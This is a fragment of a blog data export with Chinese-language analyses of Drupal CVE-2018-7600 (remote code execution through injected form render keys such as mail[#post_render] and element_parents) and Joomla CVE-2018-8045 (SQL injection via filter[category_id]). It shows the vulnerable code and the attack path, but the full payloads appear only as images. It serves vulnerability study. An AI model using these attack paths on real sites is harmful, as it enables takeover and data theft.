$this-&gt;executeInRenderContext(new RenderContext(), function () use (&amp;$elements) {\nreturn $this-&gt;render($elements, TRUE);\n});\n$this-&gt;isRenderingRoot = FALSE;\n\nreturn $output;\n}</pre>\n<p>里面调用了render方法</p>\n<p>继续看render方法：</p>\n<pre class=\"lang:default decode:true\">public function render(&amp;$elements, $is_root_call = FALSE) {\n// Since #pre_render, #post_render, #lazy_builder callbacks and theme\n// functions or templates may be used for generating a render array's\n// content, and we might be rendering the main content for the page, it is\n// possible that any of them throw an exception that will cause a different\n// page to be rendered (e.g. throwing\n// \\Symfony\\Component\\HttpKernel\\Exception\\NotFoundHttpException will cause\n// the 404 page to be rendered). That page might also use\n// Renderer::renderRoot() but if exceptions aren't caught here, it will be\n// impossible to call Renderer::renderRoot() again.\n// Hence, catch all exceptions, reset the isRenderingRoot property and\n// re-throw exceptions.\ntry {\nreturn $this-&gt;doRender($elements, $is_root_call);\n}\ncatch (\\Exception $e) {\n// Mark the ::rootRender() call finished due to this exception &amp; re-throw.\n$this-&gt;isRenderingRoot = FALSE;\nthrow $e;\n}\n}\n</pre>\n<p>里面调用了doRender方法</p>\n<p>继续看doRender方法：</p>\n<p>在这个方法的505行</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/22-3.png\"></p>\n<p>调用call_user_func方法</p>\n<p>此处的参数如下：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/23-3.png\"></p>\n<p>可见，这里的</p>\n<p>$callable=”exec”</p>\n<p>$elements[‘#children’]=”kingsguard_text”(这里我们传入的恶意代码，这里我就不演示了)</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结**:**\"></a><strong>总结**</strong>:**</h2><p>这个漏洞看起来是一个漏洞，其实我认为，它是由两个小的鸡肋的问题组成的，第一次就是在buildform处，用户传入的变量没有受到限制，导致可以传入mail[#post_render]、mail[#type]这样的变量，但是单单这个问题，还不严重，因为对于最终渲染的html页面来说，传入的数组仍然是数组，不能被当成元素来解析。但是偏偏uploadAjaxCallback方法中的$form_parents变量是直接通过get(‘element_parents’)得来的，这下两个一结合，$form_parents把之前传入的数值当成元素了，这下就造成了一个大洞。</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/机器学习算法2.jpg","excerpt":"<p>近日，流行的开源内容管理框架Drupal曝出一个远程代码执行漏洞，漏洞威胁等级为高危，攻击者可以利用该漏洞执行恶意代码，导致网站完全被控制。漏洞对应的CVE编号为CVE-2018-7600。</p>\n<p>本篇文章对Drupal 8 - CVE-2017-7600漏洞进行了详细分析。这个漏洞看起来是一个漏洞，其实我认为，它是由两个小的鸡肋问题组成的。具体是什么呢？</p>","more":"<h2 id=\"CVE-2018-7600-漏洞分析\"><a href=\"#CVE-2018-7600-漏洞分析\" class=\"headerlink\" title=\"CVE-2018-7600 漏洞分析\"></a><strong>CVE-2018-7600 漏洞分析</strong></h2><p>这个漏洞的<strong>根本原因</strong>出在drupal对表单的渲染上：</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/%E5%9B%BE%E7%89%87-1-10.png\"></p>\n<p>可见，在drupal中，我们不需要直接写html表单，而是先创建一个数组，表单呈现引擎通过位于\\drupal\\core\\lib\\Drupal\\Core\\Form\\FormBuilder.php文件中的buildForm方法构造出一个名为$form表单，然后成对应的html表单进行呈现。</p>\n<p>通过下图buildform的定义，可以看出它是用来构造一个表单的</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/2-13.png\"></p>\n<p>最终的$form是如下图这个样子：</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/3-13-743x1024.png\"></p>\n<p>这个漏洞，恰恰就出在了这里。</p>\n<p>但是对于一个drupal框架的应用程序来说，后台表单数组都是开发者写好的，像这个样子</p>\n<pre class=\"lang:default decode:true\">public function form(array $form, FormStateInterface $form_state) {\n$user = $this-&gt;currentUser();\n/** @var \\Drupal\\user\\UserInterface $account */\n$account = $this-&gt;entity;\n$admin = $user-&gt;hasPermission('administer users');\n// Pass access information to the submit handler. Running an access check\n// inside the submit function interferes with form processing and breaks\n// hook_form_alter().\n$form['administer_users'] = [\n'#type' =&gt; 'value',\n'#value' =&gt; $admin,\n];\n\n$form['#attached']['library'][] = 'core/drupal.form';\n\n// For non-admin users, populate the form fields using data from the\n// browser.\nif (!$admin) {\n$form['#attributes']['data-user-info-from-browser'] = TRUE;\n}\n\n// Because the user status has security implications, users are blocked by\n// default when created programmatically and need to be actively activated\n// if needed. When administrators create users from the user interface,\n// however, we assume that they should be created as activated by default.\nif ($admin) {\n$account-&gt;activate();\n}\n\n// Start with the default user account fields.\n$form = parent::form($form, $form_state, $account);\n\nreturn $form;\n}\n</pre>\n<p>攻击者是无法改变表单数组元素的key值的。</p>\n<p>很多应用都提供了如下的一个便利的方法：</p>\n<p>比如要注册一个用户，用户名、密码、邮箱、电话，这些东西都填好了。当点击提交的时候，网站告诉你，用户名已存在。</p>\n<p>这时候，你会发现，密码、邮箱、电话这些元素不需要你再次填写了，页面已经将保存下来了。</p>\n<p>drupal系统同样有这样的功能，具体如何实现的呢？下面我们做个试验：</p>\n<p>我们先提交个正常的表单</p>\n<p>先在buildform函数返回处下断后</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/4-12.png\"></p>\n<p>填写表单并提交</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/5-12.png\"></p>\n<p>页面跳转到注册成功页面，</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/6-12.png\"></p>\n<p>我们在buildform函数返回处下的断点根本没有断下来。</p>\n<p>接着我们再按着上面的表单一模一样的注册一个看看：</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/7-9.png\"></p>\n<p>但这次呢，在断点处成功断下了：</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/8-8.png\"></p>\n<p>在这处断点，我们把name的值改为”kingsguard_test_1”试试</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/9-7.png\"></p>\n<p>这次的返回页面如下：</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/10-7.png\"></p>\n<p><strong>整个流程是：</strong></p>\n<ol>\n<li>用户填写表单-&gt;表单没有问题-&gt;返回注册成功页面</li>\n<li>用户填写表单-&gt;表单内容有问题（例如用户名已被注册）-&gt;调用buildform方法，把用户传入的内容一同构造为表单数组-&gt;渲染表单数组为html页面返回<br>这就是刚刚在buildform断点处把name值由kingsguard改为kingsguard_test_1，返回的页面里username值也变成kingsguard_test_1的原因。</li>\n</ol>\n<p>到这里，攻击链已经很明确了，攻击者传入的值，可以通过buildform（方法构造表单数组，并且这个表单数组接下来还会被drupal表单呈现引擎解析为html页面。</p>\n<p>当我们在这个注册表单页面里，如果想上传一张图片</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/11-6.png\"></p>\n<p>这时候发送的请求如下</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/12-6.png\"></p>\n<p>当上传成功后，往往有一个缩略图显示在那，如下图菊花处：</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/13-5.png\"></p>\n<p>这个缩略图，是通过drupal\\core\\modules\\file\\src\\Element\\ManagedFile.php文件中的uploadAjaxCallback方法来解析。</p>\n<p>注意，还记的上文buildform方法吗？buildform生成$form数组后，将生成的$form数组传递给uploadAjaxCallback方法来解析，目的是在返回页面上显示那个缩率的菊花。</p>\n<p>既然流程已经捋顺了，我们通过构造poc来动态调试下，发送如下图post包：</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/14-5.png\"></p>\n<p>首先会进入buildform函数来构造表单数组，接下来这个表单数组($form)会进入uploadAjaxCallback方法。</p>\n<p>看下这个uploadAjaxCallback方法：</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/15-5.png\"></p>\n<p>传入uploadAjaxCallback方法中的$form变量，就是buildform方法生成的表单数组：</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/16-5.png\"></p>\n<p>$form数组传入uploadAjaxCallback方法中后,可以看到有这么一行（下图红框处）：</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/17-5.png\"></p>\n<p>$form_parents变量竟然可以从get中传入，意味着这个变量可控,其实就是我们poc中的element_parents=account/mail/%23value。</p>\n<p>通过poc，此处的$form_parents变量如下图</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/18-4.png\"></p>\n<p>$form_parents变量和$form通过NestedArray::getValue方法后，结果值赋给$form</p>\n<p>新的form变量如下：</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/19-3.png\"></p>\n<p>接下来看这里的renderRoot方法：</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/20-3.png\"></p>\n<p>此处传入的$form变量为：</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/21-3.png\"></p>\n<p>继续看renderRoot方法：</p>\n<p>&nbsp;</p>\n<pre class=\"lang:default decode:true\">public function renderRoot(&amp;$elements) {\n// Disallow calling ::renderRoot() from within another ::renderRoot() call.\nif ($this-&gt;isRenderingRoot) {\n$this-&gt;isRenderingRoot = FALSE;\nthrow new \\LogicException('A stray renderRoot() invocation is causing bubbling of attached assets to break.');\n}\n\n// Render in its own render context.\n$this-&gt;isRenderingRoot = TRUE;\n$output = $this-&gt;executeInRenderContext(new RenderContext(), function () use (&amp;$elements) {\nreturn $this-&gt;render($elements, TRUE);\n});\n$this-&gt;isRenderingRoot = FALSE;\n\nreturn $output;\n}</pre>\n<p>里面调用了render方法</p>\n<p>继续看render方法：</p>\n<pre class=\"lang:default decode:true\">public function render(&amp;$elements, $is_root_call = FALSE) {\n// Since #pre_render, #post_render, #lazy_builder callbacks and theme\n// functions or templates may be used for generating a render array's\n// content, and we might be rendering the main content for the page, it is\n// possible that any of them throw an exception that will cause a different\n// page to be rendered (e.g. throwing\n// \\Symfony\\Component\\HttpKernel\\Exception\\NotFoundHttpException will cause\n// the 404 page to be rendered). That page might also use\n// Renderer::renderRoot() but if exceptions aren't caught here, it will be\n// impossible to call Renderer::renderRoot() again.\n// Hence, catch all exceptions, reset the isRenderingRoot property and\n// re-throw exceptions.\ntry {\nreturn $this-&gt;doRender($elements, $is_root_call);\n}\ncatch (\\Exception $e) {\n// Mark the ::rootRender() call finished due to this exception &amp; re-throw.\n$this-&gt;isRenderingRoot = FALSE;\nthrow $e;\n}\n}\n</pre>\n<p>里面调用了doRender方法</p>\n<p>继续看doRender方法：</p>\n<p>在这个方法的505行</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/22-3.png\"></p>\n<p>调用call_user_func方法</p>\n<p>此处的参数如下：</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/23-3.png\"></p>\n<p>可见，这里的</p>\n<p>$callable=”exec”</p>\n<p>$elements[‘#children’]=”kingsguard_text”(这里我们传入的恶意代码，这里我就不演示了)</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结**:**\"></a><strong>总结**</strong>:**</h2><p>这个漏洞看起来是一个漏洞，其实我认为，它是由两个小的鸡肋的问题组成的，第一次就是在buildform处，用户传入的变量没有受到限制，导致可以传入mail[#post_render]、mail[#type]这样的变量，但是单单这个问题，还不严重，因为对于最终渲染的html页面来说，传入的数组仍然是数组，不能被当成元素来解析。但是偏偏uploadAjaxCallback方法中的$form_parents变量是直接通过get(‘element_parents’)得来的，这下两个一结合，$form_parents把之前传入的数值当成元素了，这下就造成了一个大洞。</p>"},{"title":"Joomla内核SQL注入漏洞（CVE-2018-8045）分析","date":"2018-03-29T07:32:43.000Z","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\n近日Joomla又爆出sql注入漏洞（CVE-2018-8045），让我们一起分析一下这个漏洞吧！\n\n<!--more-->\n\n## CVE-2018-8045 漏洞简介\n\n漏洞具体情况可参见绿盟科技安全威胁周报-201812周：\n\nhttp://blog.nsfocus.net/nsfocus-201812/\n\n**Joomla! Core SQL注入漏洞**\n\n*   NSFOCUS ID\n\n    *   39158\n\n*   CVE ID\n\n    *   CVE-2018-8045\n\n*   受影响版本\n\n    *   Joomla! Joomla! 3.5.0-3.8.5\n\n*   漏洞点评\n\n    *   Joomla是一套网站内容管理系统,使用PHP语言和MySQL数据库开发。Joomla! 3.5.0 -3.8.5版本对SQL语句内的变量缺少类型转换，导致User Notes列表视图内SQL注 入漏洞，可使攻击者访问或修改数据等。目前厂商已经发布了升级补丁，修复了这个 安全问题，请用户及时到厂商的主页下载。\n\n## **CVE-2018-8045 漏洞详情**\n\n我们先看下joomla官网怎么说的：\n\n[https://developer.joomla.org/security-centre/723-20180301-core-sqli-vulnerability.html](https://developer.joomla.org/security-centre/723-20180301-core-sqli-vulnerability.html)\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/03/图片-1-3.png)\n\nUser Notes模块由于缺少变量类型转换，导致sql注入的产生。这个漏洞在3.8.6版本被解决。\n\n漏洞介绍很模糊，单从介绍来看，根本不知道这个sql注入产生的位置。\n\n但是既然是3.8.6版本解决的，那我们就来从3.8.6版本的update包中找找思路。\n\n如下是github上joomla的releases列表\n\n[https://github.com/joomla/joomla-cms/releases](https://github.com/joomla/joomla-cms/releases)\n\n找到Update from Joomla! 3.8.5升级包下载，打开下载好的升级包，根据notes这个线索搜索下。果然，在升级包中看到了一个notes.php文件。\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/03/2-9.png)\n\n我们回到github上，看下这个notes.php改动了什么。\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/03/3-9.png)\n\n很明显，升级包中的notes.php中，对$categoryId的值进行了限制，强制转换为int类型，可以确定，这个漏洞就出在这里。\n\n在这里说个题外话，notes.php中getState方法出现过很多次，分别有\n\ngetState('filter.search')\n\ngetState('filter.published')\n\ngetState('filter.category_id')\n\ngetState('filter.user_id')\n\ngetState('filter.level')\n\n但是唯有getState('filter.category_id')方法没有进行(int)类型转换，存在着漏洞隐患，这可能是开发者一时的疏忽吧。\n\n## **CVE-2018-8045 漏洞分析**\n\n来看下存在漏洞的代码：\n<pre class=\"lang:default decode:true\">// Filter by a single or group of categories.\n$categoryId = $this-&gt;getState('filter.category_id');\n\nif ($categoryId &amp;&amp; is_scalar($categoryId))\n{\n   $query-&gt;where('a.catid = ' . $categoryId);\n}</pre>\n$categoryId未经过滤直接拼接sql语句进行查询，造成了sql注入。\n\n但是$categoryId参数如何控制呢？\n\n存在漏洞的文件位于\\administrator\\components\\com_users\\models\\notes.php，是一个joomla的模型文件，它的控制器是\\administrator\\components\\com_users\\controllers\\notes.php\n\n我们登录joomla后台来看一下在哪里触发这个漏洞。\n\n访问[http://xxx/joomla/administrator/index.php?option=com_users&amp;view=notes](http://xxx/joomla/administrator/index.php?option=com_users&amp;view=notes) 即可触发该控制器。\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/03/4-8.png)\n\n但是如何控制$categoryId参数呢？如果只访问\n\n[http://xxx/joomla/administrator/index.php?option=com_users&amp;view=notes](http://xxx/joomla/administrator/index.php?option=com_users&amp;view=notes)\n\n只会向服务器发送一个get请求，请求中根本不包含我们想要的categoryId参数\n\n先看下出问题的这行代码\n<pre class=\"lang:default decode:true\">$categoryId = $this-&gt;getState('filter.category_id');</pre>\n从getState('filter.category_id')不难看出来，它的作用是一个过滤器，用来选择category_id的\n\n因此想向它传参，一定和高级搜索之类功能的有关。\n\n选择Search Tools选项 Select Category选项。\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/03/5-7.png)\n\n此时joomla的发包情况\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/03/6-5.png)\n\n此时我们需要的filter[category_id]参数出现在了post参数中，通过这个参数的值，即可畅通无阻的进行注入。\n\n下面验证下这个filter[category_id]参部分可以直接传递给后台的$categoryId参数\n\n我们修改了filter[category_id]参数内容为’kingsguard_test’，并发包\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/03/7-4.png)\n\n后台下断点，抓取$categoryId值，可见’kingsguard_test’原封不动的被传递给$categoryId参数，并拼接sql语句进行查询。\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/03/8-4.png)\n\n## **利用验证**\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/03/9-3.png)\n\n## 漏洞修复\n\n升级joomla至最新版本\n\n&nbsp;\n\n&nbsp;\n\n* * *\n\n如有意成为绿盟科技博客作者，欢迎进入作者群讨论！\n\n绿盟科技博客作者QQ群：695158981\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/03/WechatIMG749-150x150.png)\n\n&nbsp;\n\n&nbsp;\n\n&nbsp;\n\n&nbsp;\n\n&nbsp;\n\n绿盟科技博客作者微信群：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/03/WechatIMG68-226x300.jpeg)\n\n&nbsp;\n\n&nbsp;\n\n<div class=\"wumii-hook\"></div>","source":"_posts/cve-2018-804-analysis.md","raw":"---\ntitle: Joomla内核SQL注入漏洞（CVE-2018-8045）分析\ndate: 2018-03-29 15:32:43\ntags: web漏洞分析\ncategories: 技术\n\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\n近日Joomla又爆出sql注入漏洞（CVE-2018-8045），让我们一起分析一下这个漏洞吧！\n\n<!--more-->\n\n## CVE-2018-8045 漏洞简介\n\n漏洞具体情况可参见绿盟科技安全威胁周报-201812周：\n\nhttp://blog.nsfocus.net/nsfocus-201812/\n\n**Joomla! Core SQL注入漏洞**\n\n*   NSFOCUS ID\n\n    *   39158\n\n*   CVE ID\n\n    *   CVE-2018-8045\n\n*   受影响版本\n\n    *   Joomla! Joomla! 3.5.0-3.8.5\n\n*   漏洞点评\n\n    *   Joomla是一套网站内容管理系统,使用PHP语言和MySQL数据库开发。Joomla! 3.5.0 -3.8.5版本对SQL语句内的变量缺少类型转换，导致User Notes列表视图内SQL注 入漏洞，可使攻击者访问或修改数据等。目前厂商已经发布了升级补丁，修复了这个 安全问题，请用户及时到厂商的主页下载。\n\n## **CVE-2018-8045 漏洞详情**\n\n我们先看下joomla官网怎么说的：\n\n[https://developer.joomla.org/security-centre/723-20180301-core-sqli-vulnerability.html](https://developer.joomla.org/security-centre/723-20180301-core-sqli-vulnerability.html)\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/03/图片-1-3.png)\n\nUser Notes模块由于缺少变量类型转换，导致sql注入的产生。这个漏洞在3.8.6版本被解决。\n\n漏洞介绍很模糊，单从介绍来看，根本不知道这个sql注入产生的位置。\n\n但是既然是3.8.6版本解决的，那我们就来从3.8.6版本的update包中找找思路。\n\n如下是github上joomla的releases列表\n\n[https://github.com/joomla/joomla-cms/releases](https://github.com/joomla/joomla-cms/releases)\n\n找到Update from Joomla! 3.8.5升级包下载，打开下载好的升级包，根据notes这个线索搜索下。果然，在升级包中看到了一个notes.php文件。\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/03/2-9.png)\n\n我们回到github上，看下这个notes.php改动了什么。\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/03/3-9.png)\n\n很明显，升级包中的notes.php中，对$categoryId的值进行了限制，强制转换为int类型，可以确定，这个漏洞就出在这里。\n\n在这里说个题外话，notes.php中getState方法出现过很多次，分别有\n\ngetState('filter.search')\n\ngetState('filter.published')\n\ngetState('filter.category_id')\n\ngetState('filter.user_id')\n\ngetState('filter.level')\n\n但是唯有getState('filter.category_id')方法没有进行(int)类型转换，存在着漏洞隐患，这可能是开发者一时的疏忽吧。\n\n## **CVE-2018-8045 漏洞分析**\n\n来看下存在漏洞的代码：\n<pre class=\"lang:default decode:true\">// Filter by a single or group of categories.\n$categoryId = $this-&gt;getState('filter.category_id');\n\nif ($categoryId &amp;&amp; is_scalar($categoryId))\n{\n   $query-&gt;where('a.catid = ' . $categoryId);\n}</pre>\n$categoryId未经过滤直接拼接sql语句进行查询，造成了sql注入。\n\n但是$categoryId参数如何控制呢？\n\n存在漏洞的文件位于\\administrator\\components\\com_users\\models\\notes.php，是一个joomla的模型文件，它的控制器是\\administrator\\components\\com_users\\controllers\\notes.php\n\n我们登录joomla后台来看一下在哪里触发这个漏洞。\n\n访问[http://xxx/joomla/administrator/index.php?option=com_users&amp;view=notes](http://xxx/joomla/administrator/index.php?option=com_users&amp;view=notes) 即可触发该控制器。\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/03/4-8.png)\n\n但是如何控制$categoryId参数呢？如果只访问\n\n[http://xxx/joomla/administrator/index.php?option=com_users&amp;view=notes](http://xxx/joomla/administrator/index.php?option=com_users&amp;view=notes)\n\n只会向服务器发送一个get请求，请求中根本不包含我们想要的categoryId参数\n\n先看下出问题的这行代码\n<pre class=\"lang:default decode:true\">$categoryId = $this-&gt;getState('filter.category_id');</pre>\n从getState('filter.category_id')不难看出来，它的作用是一个过滤器，用来选择category_id的\n\n因此想向它传参，一定和高级搜索之类功能的有关。\n\n选择Search Tools选项 Select Category选项。\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/03/5-7.png)\n\n此时joomla的发包情况\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/03/6-5.png)\n\n此时我们需要的filter[category_id]参数出现在了post参数中，通过这个参数的值，即可畅通无阻的进行注入。\n\n下面验证下这个filter[category_id]参部分可以直接传递给后台的$categoryId参数\n\n我们修改了filter[category_id]参数内容为’kingsguard_test’，并发包\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/03/7-4.png)\n\n后台下断点，抓取$categoryId值，可见’kingsguard_test’原封不动的被传递给$categoryId参数，并拼接sql语句进行查询。\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/03/8-4.png)\n\n## **利用验证**\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/03/9-3.png)\n\n## 漏洞修复\n\n升级joomla至最新版本\n\n&nbsp;\n\n&nbsp;\n\n* * *\n\n如有意成为绿盟科技博客作者，欢迎进入作者群讨论！\n\n绿盟科技博客作者QQ群：695158981\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/03/WechatIMG749-150x150.png)\n\n&nbsp;\n\n&nbsp;\n\n&nbsp;\n\n&nbsp;\n\n&nbsp;\n\n绿盟科技博客作者微信群：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/03/WechatIMG68-226x300.jpeg)\n\n&nbsp;\n\n&nbsp;\n\n<div class=\"wumii-hook\"></div>","slug":"cve-2018-804-analysis","published":1,"updated":"2020-10-27T09:27:10.009Z","_id":"ckgrozu96002uwsa99z9b5sa9","comments":1,"layout":"post","photos":[],"link":"","content":"<p>近日Joomla又爆出sql注入漏洞（CVE-2018-8045），让我们一起分析一下这个漏洞吧！</p>\n<a id=\"more\"></a>\n\n<h2 id=\"CVE-2018-8045-漏洞简介\"><a href=\"#CVE-2018-8045-漏洞简介\" class=\"headerlink\" title=\"CVE-2018-8045 漏洞简介\"></a>CVE-2018-8045 漏洞简介</h2><p>漏洞具体情况可参见绿盟科技安全威胁周报-201812周：</p>\n<p><a href=\"http://blog.nsfocus.net/nsfocus-201812/\">http://blog.nsfocus.net/nsfocus-201812/</a></p>\n<p><strong>Joomla! Core SQL注入漏洞</strong></p>\n<ul>\n<li><p>NSFOCUS ID</p>\n<ul>\n<li>39158</li>\n</ul>\n</li>\n<li><p>CVE ID</p>\n<ul>\n<li>CVE-2018-8045</li>\n</ul>\n</li>\n<li><p>受影响版本</p>\n<ul>\n<li>Joomla! Joomla! 3.5.0-3.8.5</li>\n</ul>\n</li>\n<li><p>漏洞点评</p>\n<ul>\n<li>Joomla是一套网站内容管理系统,使用PHP语言和MySQL数据库开发。Joomla! 3.5.0 -3.8.5版本对SQL语句内的变量缺少类型转换，导致User Notes列表视图内SQL注 入漏洞，可使攻击者访问或修改数据等。目前厂商已经发布了升级补丁，修复了这个 安全问题，请用户及时到厂商的主页下载。</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"CVE-2018-8045-漏洞详情\"><a href=\"#CVE-2018-8045-漏洞详情\" class=\"headerlink\" title=\"CVE-2018-8045 漏洞详情\"></a><strong>CVE-2018-8045 漏洞详情</strong></h2><p>我们先看下joomla官网怎么说的：</p>\n<p><a href=\"https://developer.joomla.org/security-centre/723-20180301-core-sqli-vulnerability.html\">https://developer.joomla.org/security-centre/723-20180301-core-sqli-vulnerability.html</a></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/03/%E5%9B%BE%E7%89%87-1-3.png\"></p>\n<p>User Notes模块由于缺少变量类型转换，导致sql注入的产生。这个漏洞在3.8.6版本被解决。</p>\n<p>漏洞介绍很模糊，单从介绍来看，根本不知道这个sql注入产生的位置。</p>\n<p>但是既然是3.8.6版本解决的，那我们就来从3.8.6版本的update包中找找思路。</p>\n<p>如下是github上joomla的releases列表</p>\n<p><a href=\"https://github.com/joomla/joomla-cms/releases\">https://github.com/joomla/joomla-cms/releases</a></p>\n<p>找到Update from Joomla! 3.8.5升级包下载，打开下载好的升级包，根据notes这个线索搜索下。果然，在升级包中看到了一个notes.php文件。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/03/2-9.png\"></p>\n<p>我们回到github上，看下这个notes.php改动了什么。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/03/3-9.png\"></p>\n<p>很明显，升级包中的notes.php中，对$categoryId的值进行了限制，强制转换为int类型，可以确定，这个漏洞就出在这里。</p>\n<p>在这里说个题外话，notes.php中getState方法出现过很多次，分别有</p>\n<p>getState(‘filter.search’)</p>\n<p>getState(‘filter.published’)</p>\n<p>getState(‘filter.category_id’)</p>\n<p>getState(‘filter.user_id’)</p>\n<p>getState(‘filter.level’)</p>\n<p>但是唯有getState(‘filter.category_id’)方法没有进行(int)类型转换，存在着漏洞隐患，这可能是开发者一时的疏忽吧。</p>\n<h2 id=\"CVE-2018-8045-漏洞分析\"><a href=\"#CVE-2018-8045-漏洞分析\" class=\"headerlink\" title=\"CVE-2018-8045 漏洞分析\"></a><strong>CVE-2018-8045 漏洞分析</strong></h2><p>来看下存在漏洞的代码：</p>\n<pre class=\"lang:default decode:true\">// Filter by a single or group of categories.\n$categoryId = $this-&gt;getState('filter.category_id');\n\nif ($categoryId &amp;&amp; is_scalar($categoryId))\n{\n   $query-&gt;where('a.catid = ' . $categoryId);\n}</pre>\n<p>$categoryId未经过滤直接拼接sql语句进行查询，造成了sql注入。</p>\n<p>但是$categoryId参数如何控制呢？</p>\n<p>存在漏洞的文件位于\\administrator\\components\\com_users\\models\\notes.php，是一个joomla的模型文件，它的控制器是\\administrator\\components\\com_users\\controllers\\notes.php</p>\n<p>我们登录joomla后台来看一下在哪里触发这个漏洞。</p>\n<p>访问<a href=\"http://xxx/joomla/administrator/index.php?option=com_users&amp;view=notes\">http://xxx/joomla/administrator/index.php?option=com_users&amp;view=notes</a> 即可触发该控制器。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/03/4-8.png\"></p>\n<p>但是如何控制$categoryId参数呢？如果只访问</p>\n<p><a href=\"http://xxx/joomla/administrator/index.php?option=com_users&amp;view=notes\">http://xxx/joomla/administrator/index.php?option=com_users&amp;view=notes</a></p>\n<p>只会向服务器发送一个get请求，请求中根本不包含我们想要的categoryId参数</p>\n<p>先看下出问题的这行代码</p>\n<pre class=\"lang:default decode:true\">$categoryId = $this-&gt;getState('filter.category_id');</pre>\n<p>从getState(‘filter.category_id’)不难看出来，它的作用是一个过滤器，用来选择category_id的</p>\n<p>因此想向它传参，一定和高级搜索之类功能的有关。</p>\n<p>选择Search Tools选项 Select Category选项。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/03/5-7.png\"></p>\n<p>此时joomla的发包情况</p>\n<p><img src= \"/img/loading.gif\" 